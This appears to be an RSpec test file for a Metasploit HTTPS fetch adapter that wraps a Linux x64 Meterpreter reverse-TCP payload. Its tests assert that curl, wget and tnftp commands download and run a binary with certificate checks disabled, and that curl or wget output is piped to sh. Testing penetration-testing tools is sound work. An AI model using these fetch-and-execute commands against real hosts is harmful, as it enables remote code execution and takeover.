require 'rspec'

RSpec.describe 'cmd/linux/https/x64' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/linux/https/x64/meterpreter_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/linux/https/x64',
        'singles/linux/x64/meterpreter_reverse_tcp'
      ]
    )
  end

  let(:lhost)           { '192.168.1.100' }
  let(:lport)           { '4444' }
  let(:fetch_srvhost)   { '192.168.1.100' }
  let(:fetch_srvport)   { 8443 }
  let(:fetch_uripath)   { 'testpayload' }
  let(:fetch_filename)  { 'payload' }
  let(:fetch_writable_dir) { './' }

  let(:datastore_values) do
    {
      'LHOST'              => lhost,
      'LPORT'              => lport,
      'FETCH_SRVHOST'      => fetch_srvhost,
      'FETCH_SRVPORT'      => fetch_srvport,
      'FETCH_URIPATH'      => fetch_uripath,
      'FETCH_FILENAME'     => fetch_filename,
      'FETCH_WRITABLE_DIR' => fetch_writable_dir,
      'FETCH_FILELESS'     => 'none',
      'FETCH_PIPE'         => false,
      'FETCH_CHECK_CERT'   => false
    }
  end

  before(:each) { subject.datastore.merge!(datastore_values) }

  # ---------------------------------------------------------------------------
  # Module metadata
  # ---------------------------------------------------------------------------

  describe 'module metadata' do
    it 'includes HTTPS Fetch in the name' do
      expect(subject.name).to include('HTTPS Fetch')
    end

    it 'targets the Linux platform' do
      expect(subject.platform.platforms).to include(Msf::Module::Platform::Linux)
    end

    it 'uses CMD arch' do
      expect(subject.arch).to include(ARCH_CMD)
    end

    it 'adapts x64 payloads' do
      expect(subject.send(:module_info)['AdaptedArch']).to eq(ARCH_X64)
    end

    it 'has linux as the adapted platform' do
      expect(subject.send(:module_info)['AdaptedPlatform']).to eq('linux')
    end
  end

  # ---------------------------------------------------------------------------
  # Protocol and platform helpers
  # ---------------------------------------------------------------------------

  describe '#fetch_protocol' do
    it 'returns HTTPS' do
      expect(subject.fetch_protocol).to eq('HTTPS')
    end
  end

  describe '#windows?' do
    it 'returns false for this Linux module' do
      expect(subject.windows?).to be(false)
    end
  end

  # ---------------------------------------------------------------------------
  # FETCH_COMMAND option
  # ---------------------------------------------------------------------------

  describe 'FETCH_COMMAND option' do
    it 'defaults to CURL' do
      fresh = load_and_create_module(
        module_type: 'payload',
        reference_name: 'cmd/linux/https/x64/meterpreter_reverse_tcp',
        ancestor_reference_names: [
          'adapters/cmd/linux/https/x64',
          'singles/linux/x64/meterpreter_reverse_tcp'
        ]
      )
      expect(fresh.datastore['FETCH_COMMAND']).to eq('CURL')
    end

    %w[CURL WGET TNFTP FTP GET].each do |cmd|
      it "accepts #{cmd} as a valid value" do
        expect(subject.options['FETCH_COMMAND'].valid?(cmd)).to be(true)
      end
    end

    it 'rejects CERTUTIL as an invalid value' do
      expect(subject.options['FETCH_COMMAND'].valid?('CERTUTIL')).to be(false)
    end
  end

  # ---------------------------------------------------------------------------
  # generate_fetch_commands
  # ---------------------------------------------------------------------------

  describe '#generate_fetch_commands' do
    context 'with CURL' do
      before { subject.datastore['FETCH_COMMAND'] = 'CURL' }

      it 'uses curl -sko to download over HTTPS' do
        expect(subject.generate_fetch_commands).to include('curl -sko')
      end

      it 'includes the HTTPS URL with host, port, and URI path' do
        expect(subject.generate_fetch_commands).to include(
          "https://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end

      it 'makes the file executable and runs it' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('chmod +x')
        expect(cmd).to include("#{fetch_writable_dir}#{fetch_filename}&")
      end
    end

    context 'with WGET' do
      before { subject.datastore['FETCH_COMMAND'] = 'WGET' }

      it 'uses wget with --no-check-certificate over HTTPS' do
        cmd = subject.generate_fetch_commands
        expect(cmd).to include('wget')
        expect(cmd).to include('--no-check-certificate')
      end

      it 'includes the HTTPS URL' do
        expect(subject.generate_fetch_commands).to include(
          "https://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end
    end

    context 'with TNFTP' do
      before { subject.datastore['FETCH_COMMAND'] = 'TNFTP' }

      it 'sets FTPSSLNOVERIFY=1 when FETCH_CHECK_CERT is false' do
        subject.datastore['FETCH_CHECK_CERT'] = false
        expect(subject.generate_fetch_commands).to include('FTPSSLNOVERIFY=1')
      end

      it 'omits FTPSSLNOVERIFY when FETCH_CHECK_CERT is true' do
        subject.datastore['FETCH_CHECK_CERT'] = true
        expect(subject.generate_fetch_commands).not_to include('FTPSSLNOVERIFY')
      end

      it 'uses tnftp -Vo to download' do
        expect(subject.generate_fetch_commands).to include('tnftp -Vo')
      end

      it 'includes the HTTPS URL' do
        expect(subject.generate_fetch_commands).to include(
          "https://#{fetch_srvhost}:#{fetch_srvport}/#{fetch_uripath}"
        )
      end
    end

    context 'with GET' do
      before { subject.datastore['FETCH_COMMAND'] = 'GET' }

      it 'raises a bad-config error because GET cannot disable certificate verification' do
        expect { subject.generate_fetch_commands }.to raise_error(RuntimeError, /bad-config.*FETCH_CHECK_CERT/)
      end
    end
  end

  # ---------------------------------------------------------------------------
  # generate_pipe_command
  # ---------------------------------------------------------------------------

  describe '#generate_pipe_command' do
    let(:pipe_uri) { 'pipe_script_path' }

    context 'with CURL' do
      before { subject.datastore['FETCH_COMMAND'] = 'CURL' }

      it 'pipes curl -sk stdout to sh over HTTPS' do
        cmd = subject.generate_pipe_command(pipe_uri)
        expect(cmd).to match(/curl -sk https:\/\/.+\|sh/)
      end

      it 'includes the pipe URI in the URL' do
        expect(subject.generate_pipe_command(pipe_uri)).to include(pipe_uri)
      end
    end

    context 'with WGET' do
      before { subject.datastore['FETCH_COMMAND'] = 'WGET' }

      it 'pipes wget --no-check-certificate stdout to sh over HTTPS' do
        cmd = subject.generate_pipe_command(pipe_uri)
        expect(cmd).to include('wget')
        expect(cmd).to include('--no-check-certificate')
        expect(cmd).to include('|sh')
      end
    end
  end
end
